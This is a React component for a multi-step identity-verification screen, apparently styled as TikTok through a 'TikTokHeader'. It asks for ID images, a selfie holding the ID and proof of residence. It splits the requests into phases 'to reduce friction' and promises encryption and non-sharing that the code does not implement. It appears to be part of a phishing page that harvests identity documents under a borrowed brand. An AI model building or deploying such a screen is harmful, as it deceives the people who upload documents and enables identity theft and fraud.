import { useState, useEffect, useRef } from "react";
import { Button } from "@/components/ui/button";
import { Upload, CheckCircle, ShieldCheck, Camera, ChevronLeft, FileText, Home, User, Info } from "lucide-react";
import TikTokHeader from "./TikTokHeader";

interface DocumentUploadScreenProps {
  userName: string;
  onSubmit: () => void;
}

interface UploadField {
  label: string;
  shortLabel: string;
  description: string;
  key: string;
  icon: typeof Upload;
  required: "initial" | "additional";
}

// Initial phase: only 2 documents to reduce friction
// Additional phase: 2 more requested after the first batch
const fields: UploadField[] = [
  { label: "Identity Document (Front)", shortLabel: "ID Front", description: "Upload the front of your ID, passport, or driver's license", key: "id_front", icon: FileText, required: "initial" },
  { label: "Selfie with Document", shortLabel: "Selfie", description: "Take a selfie holding your identity document", key: "selfie", icon: User, required: "initial" },
  { label: "Identity Document (Back)", shortLabel: "ID Back", description: "Upload the back of your identity document", key: "id_back", icon: FileText, required: "additional" },
  { label: "Proof of Residence", shortLabel: "Residence", description: "Utility bill or bank statement (last 3 months)", key: "residence", icon: Home, required: "additional" },
];

const initialFields = fields.filter((f) => f.required === "initial");
const additionalFields = fields.filter((f) => f.required === "additional");

const DocumentUploadScreen = ({ userName, onSubmit }: DocumentUploadScreenProps) => {
  const [files, setFiles] = useState<Record<string, File | null>>({});
  const [submitting, setSubmitting] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [phase, setPhase] = useState<"initial" | "additional">("initial");
  const [autoAdvancing, setAutoAdvancing] = useState(false);
  const autoAdvanceTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const activeFields = phase === "initial" ? initialFields : additionalFields;
  const field = activeFields[currentStep];
  const uploaded = !!files[field?.key];
  const isLastStep = currentStep === activeFields.length - 1;

  const uploadedCount = fields.filter((f) => files[f.key]).length;
  const progressPercent = (uploadedCount / fields.length) * 100;

  const advanceToNext = () => {
    if (isLastStep) {
      if (phase === "initial") {
        // Move to additional documents phase
        setPhase("additional");
        setCurrentStep(0);
      } else {
        // All done — submit
        setSubmitting(true);
        onSubmit();
      }
    } else {
      setCurrentStep((prev) => prev + 1);
    }
  };

  // Auto-advance after upload completes
  useEffect(() => {
    if (autoAdvancing && uploaded) {
      autoAdvanceTimer.current = setTimeout(() => {
        setAutoAdvancing(false);
        advanceToNext();
      }, 1100);
    }
    return () => {
      if (autoAdvanceTimer.current) clearTimeout(autoAdvanceTimer.current);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [autoAdvancing, uploaded]);

  const handleFile = (key: string, file: File | null) => {
    if (!file) return;
    setFiles((prev) => ({ ...prev, [key]: file }));
    // Trigger auto-advance after showing the success state
    setAutoAdvancing(true);
  };

  const handleBack = () => {
    if (currentStep > 0) {
      setCurrentStep((prev) => prev - 1);
    } else if (phase === "additional") {
      // Go back to initial phase's last step
      setPhase("initial");
      setCurrentStep(initialFields.length - 1);
    }
  };

  if (!field) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <TikTokHeader showHelp />

      <div className="flex-1 px-6 py-6">
        <p className="text-sm text-muted-foreground mb-1">
          Welcome back, <strong className="text-foreground">{userName}!</strong>
        </p>

        <div className="mt-4 mb-2 flex items-center justify-between">
          <h2 className="text-xl font-semibold">Verify your identity</h2>
          <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
            Step 2 of 4
          </span>
        </div>

        {/* Progress bar */}
        <div className="mb-5">
          <div className="flex justify-between text-xs text-muted-foreground mb-1.5">
            <span>{uploadedCount} of {fields.length} uploaded</span>
            <span>{Math.round(progressPercent)}%</span>
          </div>
          <div className="relative h-2 bg-secondary rounded-full overflow-hidden">
            <div
              className="absolute top-0 left-0 h-full bg-success rounded-full transition-all duration-500 ease-out"
              style={{ width: `${progressPercent}%` }}
            />
          </div>
        </div>

        {/* Phase indicator */}
        {phase === "initial" && (
          <div className="flex items-center gap-2 p-3 rounded-xl bg-primary/5 border border-primary/15 mb-4">
            <Info className="w-4 h-4 text-primary shrink-0" />
            <p className="text-xs text-muted-foreground">
              Just 2 quick uploads to get started — we may request additional documents during review.
            </p>
          </div>
        )}
        {phase === "additional" && (
          <div className="flex items-center gap-2 p-3 rounded-xl bg-warning/5 border border-warning/20 mb-4">
            <Info className="w-4 h-4 text-warning shrink-0" />
            <p className="text-xs text-muted-foreground">
              Almost there! Please upload these final documents to complete verification.
            </p>
          </div>
        )}

        {/* Step dots — all 4 documents */}
        <div className="flex items-center justify-center gap-2 mb-6">
          {fields.map((f, i) => {
            const isDone = !!files[f.key];
            const globalIndex = phase === "initial" ? i : initialFields.length + i;
            const isActive = phase === "initial"
              ? i === currentStep
              : (initialFields.length + currentStep) === globalIndex;
            return (
              <button
                key={f.key}
                onClick={() => {
                  const targetPhase = f.required;
                  setPhase(targetPhase);
                  setCurrentStep(targetPhase === "initial" ? i : i - initialFields.length);
                }}
                className={`transition-all duration-300 ${
                  isActive
                    ? "w-8 h-2 rounded-full bg-foreground"
                    : isDone
                    ? "w-2 h-2 rounded-full bg-success"
                    : "w-2 h-2 rounded-full bg-border"
                }`}
                aria-label={f.shortLabel}
              />
            );
          })}
        </div>

        {/* Current document card */}
        <div key={field.key} className="animate-fade-in">
          <div className="flex items-center gap-3 mb-4">
            <div className="flex items-center justify-center w-12 h-12 rounded-xl bg-secondary shrink-0">
              {uploaded ? (
                <CheckCircle className="w-6 h-6 text-success" />
              ) : (
                <field.icon className="w-5 h-5 text-muted-foreground" />
              )}
            </div>
            <div>
              <p className="text-sm font-semibold">
                Document {uploadedCount + (uploaded ? 0 : 1)} of {fields.length}
              </p>
              <p className="text-xs text-muted-foreground">{field.shortLabel}</p>
            </div>
          </div>

          <h3 className="text-lg font-semibold mb-1">{field.label}</h3>
          <p className="text-sm text-muted-foreground mb-5">{field.description}</p>

          {/* Upload area */}
          <label
            className={`flex flex-col items-center justify-center gap-3 p-8 rounded-2xl border-2 border-dashed cursor-pointer transition-all duration-300 ${
              uploaded
                ? "border-success/40 bg-success/5"
                : "border-border bg-card hover:border-foreground/30 hover:bg-secondary/50"
            }`}
          >
            <div className={`flex items-center justify-center w-16 h-16 rounded-full transition-all ${
              uploaded ? "bg-success/10" : "bg-secondary"
            }`}>
              {uploaded ? (
                <CheckCircle className="w-8 h-8 text-success animate-in fade-in zoom-in duration-300" />
              ) : field.key === "selfie" ? (
                <Camera className="w-7 h-7 text-muted-foreground" />
              ) : (
                <Upload className="w-7 h-7 text-muted-foreground" />
              )}
            </div>
            {uploaded ? (
              <div className="text-center">
                <p className="text-sm font-semibold text-success truncate max-w-[220px]">{files[field.key]!.name}</p>
                <p className="text-xs text-muted-foreground mt-1">
                  {autoAdvancing ? "Uploading — continuing..." : "Tap to replace"}
                </p>
              </div>
            ) : (
              <div className="text-center">
                <p className="text-sm font-semibold">Tap to upload</p>
                <p className="text-xs text-muted-foreground mt-1">JPG, PNG or PDF · Max 10MB</p>
              </div>
            )}
            <input
              type="file"
              accept="image/*,.pdf"
              className="hidden"
              onChange={(e) => handleFile(field.key, e.target.files?.[0] || null)}
            />
          </label>
        </div>

        {/* Security notice */}
        <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mt-5 mb-5">
          <ShieldCheck className="w-4 h-4 text-success shrink-0" />
          <p className="text-xs text-muted-foreground">
            Your data is <strong className="text-foreground">encrypted</strong> and securely stored. We never share your documents.
          </p>
        </div>

        {/* Navigation buttons */}
        <div className="flex gap-3">
          {(currentStep > 0 || phase === "additional") && (
            <Button
              variant="ghost"
              onClick={handleBack}
              className="h-14 rounded-full px-6 text-sm font-semibold text-muted-foreground"
            >
              <ChevronLeft className="w-4 h-4 mr-1" />
              Back
            </Button>
          )}
          <Button
            onClick={advanceToNext}
            disabled={!uploaded || submitting || autoAdvancing}
            className="flex-1 h-14 rounded-full text-base font-semibold"
          >
            {submitting ? (
              <span className="flex items-center gap-2">
                <span className="w-4 h-4 border-2 border-primary-foreground/40 border-t-primary-foreground rounded-full animate-spin" />
                Submitting...
              </span>
            ) : isLastStep && phase === "additional" ? (
              "Submit Documents"
            ) : isLastStep && phase === "initial" ? (
              "Continue"
            ) : (
              "Continue"
            )}
          </Button>
        </div>
      </div>
    </div>
  );
};

export default DocumentUploadScreen;
